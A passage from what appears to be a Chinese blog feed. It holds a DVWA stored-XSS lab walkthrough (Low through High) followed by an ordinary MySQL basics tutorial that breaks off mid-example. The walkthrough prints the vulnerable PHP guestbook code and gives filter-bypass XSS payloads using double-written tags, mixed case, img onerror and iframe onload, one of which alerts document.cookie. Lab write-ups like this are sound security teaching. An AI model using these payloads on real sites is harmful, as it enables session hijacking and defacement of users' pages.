src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929174153954.png" alt="image-20220929174153954"></p><div style="text-indent:2em;"><font size="4">尝试突破一下name输入框长度限制<br>F12打开控制台--->选取界面元素选择name输入框--->右键编辑HTML--->修改maxlength长度为100--->尝试插入payload--->点击Sign Guestbook</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929174657124.png" alt="image-20220929174657124"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929175015742.png" alt="image-20220929175015742"></p><blockquote><div><font size="4">这种方式在刷新界面后maxlength长度会变成默认10</font></div></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打印cookie</span></span><br><span class="line">&lt;scr&lt;script&gt;<span class="title function_ invoke__">alert</span>(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929183201300.png" alt="image-20220929183201300"></p><hr><h1 id="难度Medium"><a href="#难度Medium" class="headerlink" title="难度Medium"></a>难度Medium</h1><h2 id="页面源代码-1"><a href="#页面源代码-1" class="headerlink" title="页面源代码"></a>页面源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div><font size="4">MEDIUM等级主要是有这三个高亮的地方的修改：</font></div><ol><li><div><font size="4">对message的内容中的预定义字符之前添加反斜杠(addslashes函数)。预定义字符包括   '、"、\、NULL（其实感觉这步挺多余的，因为默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()，所以不应对已转义过的字符串使用 addslashes()，会导致双层转义</font></div></li><li><div><font size="4">将message中的预定义字符转换为html实体（htmlspecialchars函数）。预定义的字符包含&、<、>、'、"</font></div></li><li><div><font size="4">将name中的&lt;script&gt;删除（使用str_replace函数进行字符串替换，由于该函数是区分参数大小写的，所以也可以采用大写绕过）</font></div><hr><div style="text-indent:2em;"><font size="4">通过代码分析，有三种方式可以进行尝试</font></div></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#双写绕过</span></span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&lt;/script&gt;</span><br><span class="line"><span class="comment">#大小写绕过</span></span><br><span class="line">&lt;ScRipt&gt;<span class="title function_ invoke__">alert</span>(/这是一个XSS弹窗/)&lt;/ScRipt&gt;</span><br><span class="line"><span class="comment">#不带&lt;script&gt;标签绕过</span></span><br><span class="line">&lt;img src = <span class="number">1</span> onerror = <span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&gt;</span><br></pre></td></tr></table></figure><blockquote><div><font size="4">注意修改maxlength长度</font></div></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929182159389.png" alt="image-20220929182159389"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929182222789.png" alt="image-20220929182222789"></p><div><font size="4">通过判断，注入点在Name框</font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打印cookie</span></span><br><span class="line">&lt;scr&lt;script&gt;<span class="title function_ invoke__">alert</span>(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929183455819.png" alt="image-20220929183455819"></p><hr><h1 id="难度High"><a href="#难度High" class="headerlink" title="难度High"></a>难度High</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><div><font size="4">代码分析：和反射型XSS实验过滤一致，针对特殊符号，均有过滤，使得双写绕过以及大小写混淆绕过失效。(正则表达式中的i表示不区分大小写)。</font></div></blockquote><div class="tip error"><div><font size="4">大小写绕过，双写绕过都失效，只能使用&lt;script&gt;之外的标签</font></div></div><div><font size="5">一：使用img标签就行XSS payload</font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = <span class="number">1</span> onerror = <span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929185126606.png" alt="image-20220929185126606"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929185142841.png" alt="image-20220929185142841"></p><div><font size="4">判断注入点是在Message输入框中</font></div><hr><div><font size="5">二：使用iframe标签进行XSS payload</font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe οnlοad=<span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929185353888.png" alt="image-20220929185353888"></p><hr><div><font size="6"><b><center>网络安全始于心，安全网络践于行</center></b></font></div><div><font size="6"><b><center>守护网络安全，呵护精神家园</center></b></font></div><hr>]]></content>
      
      
      <categories>
          
          <category> DVWA系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL Base</title>
      <link href="/posts/725cec9e/"/>
      <url>/posts/725cec9e/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL概述"><a href="#MySQL概述" class="headerlink" title="MySQL概述"></a>MySQL概述</h1><div style="text-indent:2em;"><font size="4">MySQL是一个关系型数据库管理系统，由瑞典MySQL AB公司开发，属于 Oracle]旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB应用方面，MySQL是最好的RDBMS(Relational Database Management System，关系数据库管理系统) 应用软件之一。</font></div><div style="text-indent:2em;"><font size="4">MySQL是一种关系型数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</font></div><div style="text-indent:2em;"><font size="4">MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型和大型网站的开发都选择 MySQL 作为网站数据库。</font></div><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><div style="text-indent:2em;"><font size="4">全称 Structured Query Language，结构化查询语言。操作关系型数据库的编程语言，定义了 一套操作关系型数据库统一标准 。</font></div><h2 id="SQL语言的通用语法"><a href="#SQL语言的通用语法" class="headerlink" title="SQL语言的通用语法"></a>SQL语言的通用语法</h2><ol><li><div><font size="4">SQL语句可以单行或多行书写，以分号结尾。</font></div></li><li><div><font size="4">SQL语句可以使用空格/缩进来增强语句的可读性。</font></div></li><li><div><font size="4">MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </font></div></li><li><div><font size="4">注释： 单行注释：-- 注释内容 或 # 注释内容 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;多行注释：/* 注释内容 */</font></div></li></ol><h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><div style="text-indent:2em;"><font size="4">SQL语句，根据其功能，主要分为四类：DDL、DML、DQL、DCL。</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>分类</td>            <td>全称</td>            <td>说明</td>        </tr>        <tr align="center">            <td>DDL</td>            <td>Data Definition Language</td>            <td>数据定义语言，用来定义数据库对象(数据库，表，字段)</td>        </tr>        <tr align="center">            <td>DML</td>            <td>Data Manipulation Language</td>            <td>数据操作语言，用来对数据库表中的数据进行增删改</td>        </tr>        <tr align="center">            <td>DQL</td>            <td>Data Query Language </td>            <td>数据查询语言，用来查询数据库中表的记录</td>        </tr>        <tr align="center">            <td>DCL</td>            <td>Data Control Language</td>            <td>数据控制语言，用来创建数据库用户、控制数据库的访问权限</td>        </tr>    </table></div><h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询所有数据库</span><br><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前数据库</span><br><span class="line"><span class="keyword">select</span> database() ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">create</span> database [ if <span class="keyword">not</span> <span class="keyword">exists</span> ] 数据库名 [ <span class="keyword">default</span> charset 字符集 ] [ <span class="keyword">collate</span> 排序</span><br><span class="line">规则 ] ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建一个hours数据库, 使用数据库默认的字符集。</span><br><span class="line"><span class="keyword">create</span> database hours;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建一个hours数据库，并且指定字符集</span><br><span class="line"><span class="keyword">create</span> database hours <span class="keyword">default</span> charset utf8mb4;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除数据库</span><br><span class="line"><span class="keyword">drop</span> database [ if <span class="keyword">exists</span> ] 数据库名 ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">切换数据库</span><br><span class="line">use 数据库名 ;</span><br></pre></td></tr></table></figure><div class="tip error"><p>注意：在同一个数据库服务器中，不能创建两个名称相同的数据库，否则将会报错。</p></div><div class="tip success"><p>可以通过if not exists 参数来解决这个问题，数据库不存在, 则创建该数据库，如果存在，则不 创建。</p></div><div class="tip info"><p>如果删除一个不存在的数据库，将会报错。此时，可以加上参数 if exists ，如果数据库存在，再 执行删除，否则不执行删除。</p></div><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="查询创建"><a href="#查询创建" class="headerlink" title="查询创建"></a>查询创建</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前数据库所有表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看指定表结构</span><br><span class="line"><span class="keyword">desc</span> 表名 ;</span><br><span class="line">通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为<span class="keyword">NULL</span>，是否存在默认值等信息。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询指定表的建表语句</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> 表名 ;</span><br></pre></td></tr></table></figure><div class="tip info"><p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">创建表结构</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 [ COMMENT 字段<span class="number">1</span>注释 ],</span><br><span class="line">字段<span class="number">2</span> 字段<span class="number">2</span>类型 [ COMMENT 字段<span class="number">2</span>注释 ],</span><br><span class="line">字段<span class="number">3</span> 字段<span class="number">3</span>类型 [ COMMENT 字段<span class="number">3</span>注释 ],</span><br><span class="line">......</span><br><span class="line">字段n 字段n类型 [ COMMENT 字段n注释 ]</span><br><span class="line">) [ COMMENT 表注释 ] ;</span><br><span class="line"></span><br><span class="line">例：创建一张表 tb_user </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">id <span class="type">int</span> comment <span class="string">&#x27;编号&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">1</span>) comment <span class="string">&#x27;性别&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;用户表&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><div style="text-indent:2em;"><font size="4">在上述的建表语句中，我们在指定字段的数据类型时，用到了int，varchar，那么在MySQL中除了 以上的数据类型，还有哪些常见的数据类型呢？ 接下来,我们就来详细介绍一下MySQL的数据类型。 MySQL中的数据类型有很多，主要分为三类：数值类型、字符串类型、日期时间类型。</font></div><h5 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h5><div>    <table style="background-color:#fff;">        <tr align="center">            <td>类型</td>            <td>大小</td>            <td>有符号(SIGNED)范围</td>            <td>无符号(UNSIGNED)范围 </td>            <td>描述</td>        </tr>        <tr align="center">            <td>TINYINT</td>            <td>1byte</td>            <td>(-128，127)</td>            <td>(0，255)</td>            <td>小整数值</td>        </tr>        <tr align="center">            <td>SMALLINT</td>            <td>2bytes</td>            <td>(-32768，32767)</td>            <td>(0，65535)</td>            <td>大整数值</td>        </tr>        <tr align="center">            <td>MEDIUMINT</td>            <td>3bytes</td>            <td>(-8388608，8388607) </td>            <td>(0，16777215)</td>            <td>大整数值</td>        </tr>           <tr align="center">            <td>INT/INTEGER</td>            <td>4bytes</td>            <td>(-2147483648，2147483647)</td>            <td>(0，4294967295)</td>            <td>大整数值</td>        </tr>        <tr align="center">            <td>BIGINT</td>            <td>8bytes </td>            <td>(-2^63，2^63-1)</td>            <td>(0，2^64-1)</td>            <td>极大整数值</td>        </tr>        <tr align="center">            <td>FLOAT</td>            <td>4bytes </td>            <td>(-3.402823466 E+38，3.402823466351 E+38)</td>            <td>0 和 (1.175494351 E-38，3.402823466 E+38)</td>            <td>单精度浮点数值</td>        </tr>        <tr align="center">            <td>DOUBLE</td>            <td>8bytes </td>            <td>(-1.7976931348623157E+308，1.7976931348623157E+308)</td>            <td>0 和(2.2250738585072014E-308，1.7976931348623157E+308)</td>            <td>双精度浮点数值</td>        </tr>        <tr align="center">            <td>DECIMAL</td>            <td></td>            <td>依赖于M(精度)和D(标度)的值</td>            <td>依赖于M(精度)和D(标度)的值</td>            <td>小数值(精确定点数)</td>        </tr>    </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如:</span><br><span class="line"><span class="number">1</span>). 年龄字段 <span class="comment">-- 不会出现负数, 而且人的年龄不会太大</span></span><br><span class="line">age tinyint unsigned</span><br><span class="line"><span class="number">2</span>). 分数 <span class="comment">-- 总分100分, 最多出现一位小数</span></span><br><span class="line">score <span class="keyword">double</span>(<span class="number">4</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h5 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h5><div>    <table style="background-color:#fff;">        <tr align="center">            <td>类型</td>            <td>大小</td>            <td>描述</td>        </tr>        <tr align="center">            <td>CHAR</td>            <td>0-255 bytes</td>            <td>定长字符串(需要指定长度)</td>        </tr>        <tr align="center">            <td>VARCHAR</td>            <td>0-65535 bytes </td>            <td>变长字符串(需要指定长度)</td>        </tr>        <tr align="center">            <td>TINYBLOB</td>            <td>0-255 bytes</td>            <td>不超过255个字符的二进制数据</td>        </tr>           <tr align="center">            <td>TINYTEXT</td>            <td>0-255 bytes</td>            <td>短文本字符串</td>        </tr>        <tr align="center">            <td>BLOB</td>            <td>0-65 535 bytes </td>            <td>二进制形式的长文本数据</td>        </tr>        <tr align="center">            <td>TEXT </td>            <td>0-65 535 bytes</td>            <td>长文本数据</td>        </tr>        <tr align="center">            <td>MEDIUMBLOB </td>            <td>0-16 777 215 bytes </td>            <td>二进制形式的中等长度文本数据</td>        </tr>        <tr align="center">            <td>MEDIUMTEXT</td>            <td>0-16 777 215 bytes </td>            <td>中等长度文本数据</td>        </tr>        <tr align="center">            <td>LONGBLOB </td>            <td>0-4 294 967 295 bytes</td>            <td>二进制形式的极大文本数据</td>        </tr>        <tr align="center">            <td>LONGTEXT </td>            <td>0-4 294 967 295 bytes </td>            <td>极大文本数据</td>        </tr>    </table></div><div class="tip info"><p>char 与 varchar 都可以描述字符串，char是定长字符串，指定长度多长，就占用多少个字符，和 字段值的长度无关 。而varchar是变长字符串，指定的长度为最大占用长度 。相对来说，char的性 能会更高些。</p></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line"><span class="number">1</span>). 用户名 username <span class="comment">------&gt; 长度不定, 最长不会超过50</span></span><br><span class="line">username <span class="type">varchar</span>(<span class="number">50</span>)</span><br><span class="line"><span class="number">2</span>). 性别 gender <span class="comment">---------&gt; 存储值, 不是男,就是女</span></span><br><span class="line">gender <span class="type">char</span>(<span class="number">1</span>)</span><br><span class="line"><span class="number">3</span>). 手机号 phone <span class="comment">--------&gt; 固定长度为11</span></span><br><span class="line">phone <span class="type">char</span>(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><h5 id="日期时间类型"><a href="#日期时间类型" class="headerlink" title="日期时间类型"></a>日期时间类型</h5><div>    <table style="background-color:#fff;">        <tr align="center">            <td>类型</td>            <td>大小</td>            <td>范围</td>            <td>格式</td>            <td>描述</td>        </tr>        <tr align="center">            <td>DATE</td>            <td>3</td>            <td>1000-01-01 至 9999-12-31</td>            <td>YYYY-MM-DD</td>            <td>日期值</td>        </tr>        <tr align="center">            <td>TIME</td>            <td>3</td>            <td>-838:59:59 至 838:59:59 </td>            <td>HH:MM:SS</td>            <td>时间值或持续时间</td>        </tr>        <tr align="center">            <td>YEAR</td>            <td>1</td>            <td>1901 至 2155</td>            <td>YYYY</td>            <td>年份值</td>        </tr>           <tr align="center">            <td>DATETIME</td>            <td>8</td>            <td>1000-01-01 00:00:00 至 9999-12-31 23:59:59</td>            <td>YYYY-MM-DD HH:MM:SS</td>            <td>混合日期和时间值</td>        </tr>        <tr align="center">            <td>TIMESTAMP</td>            <td>4</td>            <td>1970-01-01 00:00:01 至 2038-01-19 03:14:07</td>            <td>YYYY-MM-DD HH:MM:SS</td>            <td>混合日期和时间值，时间戳</td>        </tr>    </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如:</span><br><span class="line"><span class="number">1</span>). 生日字段 birthday</span><br><span class="line">birthday <span class="type">date</span></span><br><span class="line"><span class="number">2</span>). 创建时间 createtime</span><br><span class="line">createtime 